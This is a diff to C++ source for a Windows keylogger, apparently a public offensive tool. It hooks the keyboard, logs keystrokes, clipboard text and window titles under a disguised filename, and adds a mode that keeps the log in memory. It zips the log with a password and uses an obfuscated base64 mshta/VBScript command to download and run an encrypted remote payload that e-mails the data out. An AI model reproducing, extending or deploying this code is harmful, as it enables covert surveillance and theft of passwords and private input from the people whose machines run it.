@@ -206,6 +206,7 @@ DWORD CMDExecute(std::string _command, bool _newWindow = true, bool _autoExit = 
 
 #define           LOG_DIRECTORY             (std::string(getenv("LOCALAPPDATA")) + R"(\KEYLOGGER_FOLDER)").c_str();
 #define           SCREENSHOT_TIMER (UINT64) 100 * 1000  // The maximum number of screenshots in 24h will be of 864 screenshots (86400ms / 100s = 864ss)
+#define           PROCESS_IN_MEMORY         TRUE        // Defines if the whole process of the log/zipping to be performed in memory
 #define           LOG_NAME                  "windows_errors.log"
 #define           ZIP_ARCHIVE_NAME          "YOUR_ZIP_NAME.zip"
 #define           ZIP_ARCHIVE_PASSWORD      "PASSWORD"  // Set NULL if you don't want to encrypt the zip archive with a password
@@ -220,7 +221,9 @@ bool              _G_LOG_LAST_IS_PRINTABLE;
 const std::string _G_LOG_DIR              = LOG_DIRECTORY;
 const std::string _G_LOG_KEYS_FILE        = _G_LOG_DIR + "\\" + LOG_NAME;
 
+#if PROCESS_IN_MEMORY
 std::wstring      _G_IN_MEM_LOG;
+#endif
 std::wstring      _G_PROC_PREV_ACTIVE_WINDOW_TITLE;
 std::wstring      _G_KB_SAME_PREV_KEY;
 std::wstring      _G_CB_PREV_TEXT;
@@ -279,9 +282,11 @@ private:
 
 				_G_LOG_LAST_IS_PRINTABLE = true;
 
-				//File::AppendText(_G_LOG_KEYS_FILE, str);
-
+				#if PROCESS_IN_MEMORY
 				_G_IN_MEM_LOG += str;
+				#else
+				File::AppendText(_G_LOG_KEYS_FILE, str);
+				#endif
 			} else {
 				if (_G_LOG_LAST_IS_PRINTABLE) {
 
@@ -289,17 +294,21 @@ private:
 					// write the new NON-printable char on a new line
 					// and append to the end a new line
 
-					//File::AppendText(_G_LOG_KEYS_FILE, L'\n' + str + L'\n');
-
+					#if PROCESS_IN_MEMORY
 					_G_IN_MEM_LOG += L'\n' + str + L'\n';
+					#else
+					File::AppendText(_G_LOG_KEYS_FILE, L'\n' + str + L'\n');
+					#endif
 				} else {
 
 					// If the last keystroke hasn't produced a printable character,
 					// append to the end a new line
 
-					//File::AppendText(_G_LOG_KEYS_FILE, str + L'\n');
-
+					#if PROCESS_IN_MEMORY
 					_G_IN_MEM_LOG += str + L'\n';
+					#else
+					File::AppendText(_G_LOG_KEYS_FILE, str + L'\n');
+					#endif
 				}
 
 				_G_LOG_LAST_IS_PRINTABLE = false;
@@ -312,13 +321,15 @@ private:
 
 			std::wstring _u = _wgetenv(L"USERNAME");
 
-			/*File::WriteAllText(_G_LOG_KEYS_FILE, L"<~[PC_USERNAME --->{" + _u + L"}<--- ]~>\n");
-			File::AppendText(_G_LOG_KEYS_FILE, L"<~[COUNTRY_CODE --->{" + _getCountryCode() + L"}<--- ]~>\n");
-			File::AppendText(_G_LOG_KEYS_FILE, L"<~[SCREEN_SIZE --->{" + _getScreenSize() + L"}<--- ]~>\n\n");*/
-
+			#if PROCESS_IN_MEMORY
 			_G_IN_MEM_LOG  = L"<~[PC_USERNAME --->{" + _u + L"}<--- ]~>\n";
 			_G_IN_MEM_LOG += L"<~[COUNTRY_CODE --->{" + _getCountryCode() + L"}<--- ]~>\n";
 			_G_IN_MEM_LOG += L"<~[SCREEN_SIZE --->{" + _getScreenSize() + L"}<--- ]~>\n\n";
+			#else
+			File::WriteAllText(_G_LOG_KEYS_FILE, L"<~[PC_USERNAME --->{" + _u + L"}<--- ]~>\n");
+			File::AppendText(_G_LOG_KEYS_FILE, L"<~[COUNTRY_CODE --->{" + _getCountryCode() + L"}<--- ]~>\n");
+			File::AppendText(_G_LOG_KEYS_FILE, L"<~[SCREEN_SIZE --->{" + _getScreenSize() + L"}<--- ]~>\n\n");
+			#endif
 		}
 	}
 	#pragma endregion
@@ -326,38 +337,53 @@ private:
 	#pragma region [SEND_LOG_TO_E-MAIL_THREAD]
 	static void _sendLogToEmail() {
 			
-			// To send the e-mail, we will use cmd, mshta and two VBS payloads
-			// I have written a small script (executor) in VBS that allow to download a HEX encoded and encrypted VBS payload
-			// who will be launched using ExecuteGlobal after the executor will be launched by mshta.exe in memory*
-			//
-			// keylogger.exe --> cmd.exe --> mshta.exe vbscript:execute(EXECUTOR_VBS_PAYLOAD)(window.close) --> VBS payload to send the e-mail is decoded/decrypted and executed with ExecuteGlobal
-			//
-			// [*] ALMOST in memory, because mshta.exe will write in a temp file the decrypted VBS payload to can launch it
-			//
-			// This function is executed on another thread to allow us to get when the mshta.exe process has finished,
-			// because when mshta have finished we need to delete the uploaded zip archive and create new one
+		// To send the e-mail, we will use cmd, mshta and two VBS payloads
+		// I have written a small script (executor) in VBS that allow to download a HEX encoded and encrypted VBS payload
+		// who will be launched using ExecuteGlobal after the executor will be launched by mshta.exe in memory*
+		//
+		// keylogger.exe --> cmd.exe --> mshta.exe vbscript:execute(EXECUTOR_VBS_PAYLOAD)(window.close) --> VBS payload to send the e-mail is decoded/decrypted and executed with ExecuteGlobal
+		//
+		// [*] ALMOST in memory, because mshta.exe will write in a temp file the decrypted VBS payload to can launch it
+		//
+		// This function is executed on another thread to allow us to get when the mshta.exe process has finished,
+		// because when mshta have finished we need to delete the uploaded zip archive and create new one
 
 
-			std::wstring _logTemp = _G_IN_MEM_LOG; // Use this only if you want to have the log in memory
+		#if PROCESS_IN_MEMORY
+		std::wstring _logTemp = _G_IN_MEM_LOG;
 
-			_writeLog(L"", false, true);           // Remove or comment this line if you want to use the log from file
+		ZipAdd(_G_HZIP, _G_LOG_KEYS_FILE.substr(_G_LOG_KEYS_FILE.find_last_of('\\') + 1).c_str(),
+			(wchar_t*)_logTemp.c_str(), _logTemp.length() * 2);
 
-			/*ZipAdd(_G_HZIP, _G_LOG_KEYS_FILE.substr(_G_LOG_KEYS_FILE.find_last_of('\\') + 1).c_str(),
-			         _G_LOG_KEYS_FILE.c_str());*/                                                     // Zip the log from the file
-			ZipAdd(_G_HZIP, _G_LOG_KEYS_FILE.substr(_G_LOG_KEYS_FILE.find_last_of('\\') + 1).c_str(),
-				  (wchar_t*)_logTemp.c_str(), _logTemp.length() * 2);                                 // Zip the log from in memory
+		void*         _zBuf;
+		unsigned long _zSize;
+		ZipGetMemory(_G_HZIP, &_zBuf, &_zSize);
+		DWORD _dwNBytes;
 
-			if (CloseZip(_G_HZIP) == ZR_OK) {
+		HANDLE _f = CreateFile((_G_LOG_DIR + "\\" + ZIP_ARCHIVE_NAME).c_str(), GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
+		WriteFile(_f, _zBuf, _zSize, &_dwNBytes, 0);
+		CloseHandle(_f);
+		#else
+		ZipAdd(_G_HZIP, _G_LOG_KEYS_FILE.substr(_G_LOG_KEYS_FILE.find_last_of('\\') + 1).c_str(),
+			   _G_LOG_KEYS_FILE.c_str());
+		#endif
+
+		if (CloseZip(_G_HZIP) == ZR_OK) {
 				// Launch mshta command (see https://github.com/Xxshark888xX/MSHTA-VBS-download-and-execute/blob/master/README.md)
-				DWORD _p = CMDExecute(base64_decode("bXNodGEuZXhlIHZic2NyaXB0OmV4ZWN1dGUoIk9uIEVycm9yIFJlc3VtZSBOZXh0OlNldCBhPUNyZWF0ZU9iamVjdCgiIk1TWE1MMi5TZXJ2ZXJYTUxIVFRQLjYuMCIiKTphLnNldE9wdGlvbiAyLDEzMDU2OndoaWxlKExlbihiKT0wKTphLm9wZW4iIkdFVCIiLCIiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1BSamVyeHdEIiIsRmFsc2U6YS5zZW5kOmI9YS5yZXNwb25zZVRleHQ6d2VuZDprPSIiWjY4S1BEIiI6Zm9yIGk9MHRvIExlbihiKS0xU3RlcCAyOmM9YyZDaHIoQXNjKENocigiIiZIIiImTWlkKGIsaSsxLDIpKSl4b3IgQXNjKE1pZChrLCgoaS8yKW1vZCBMZW4oaykpKzEsMSkpKTpOZXh0OkV4ZWN1dGVHbG9iYWwgYzoiKSh3aW5kb3cuY2xvc2Up"));
-				while (Process::Exists(_p))
-					Sleep(100);
+				DWORD _p = CMDExecute(base64_decode("bXNodGEuZXhlIHZic2NyaXB0OmV4ZWN1dGUoIk9uIEVycm9yIFJlc3VtZSBOZXh0OlNldCBhPUNyZWF0ZU9iamVjdCgiIk1TWE1MMi5TZXJ2ZXJYTUxIVFRQLjYuMCIiKTphLnNldE9wdGlvbiAyLDEzMDU2OndoaWxlKExlbihiKT0wKTphLm9wZW4iIkdFVCIiLCIiWU9VUl9VUkxfSEVSRSIiLEZhbHNlOmEuc2VuZDpiPWEucmVzcG9uc2VUZXh0OndlbmQ6az0iIllPVVJfUEFTU1dPUkRfSEVSRSIiOmZvciBpPTB0byBMZW4oYiktMVN0ZXAgMjpjPWMmQ2hyKEFzYyhDaHIoIiImSCIiJk1pZChiLGkrMSwyKSkpeG9yIEFzYyhNaWQoaywoKGkvMiltb2QgTGVuKGspKSsxLDEpKSk6TmV4dDpFeGVjdXRlR2xvYmFsIGM6Iikod2luZG93LmNsb3NlKQ=="));
+				while (Process::Exists(_p)) {
+				Sleep(100);
 			}
-			//_writeLog(L"", false, true);         // Un-comment this if you want to use the log from file
+		}
 
-			File::Delete(_G_LOG_DIR + "\\" + ZIP_ARCHIVE_NAME);
+		_writeLog(L"", false, true);
+		File::Delete(_G_LOG_DIR + "\\" + ZIP_ARCHIVE_NAME);
 
-			_G_HZIP = CreateZip((_G_LOG_DIR + "\\" + ZIP_ARCHIVE_NAME).c_str(), ZIP_ARCHIVE_PASSWORD);
+		#if PROCESS_IN_MEMORY
+		_G_HZIP = CreateZip(0, ZIP_MAX_SIZE, ZIP_ARCHIVE_PASSWORD);
+		#else
+		_G_HZIP = CreateZip((_G_LOG_DIR + "\\" + ZIP_ARCHIVE_NAME).c_str(), ZIP_ARCHIVE_PASSWORD);
+		#endif	
 	}
 	#pragma endregion
 
@@ -707,7 +733,11 @@ public:
 		_checkLogIntegirty();
 		_writeLog(L"", false, true);
 
+		#if PROCESS_IN_MEMORY
+		_G_HZIP = CreateZip(0, ZIP_MAX_SIZE, ZIP_ARCHIVE_PASSWORD);
+		#else
 		_G_HZIP = CreateZip((_G_LOG_DIR + "\\" + ZIP_ARCHIVE_NAME).c_str(), ZIP_ARCHIVE_PASSWORD);
+		#endif
 
 		_moduleHandle = GetModuleHandle(NULL);
 		_G_KB_HHOOK   = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)__KB_HOOKPROC__, _moduleHandle, NULL);
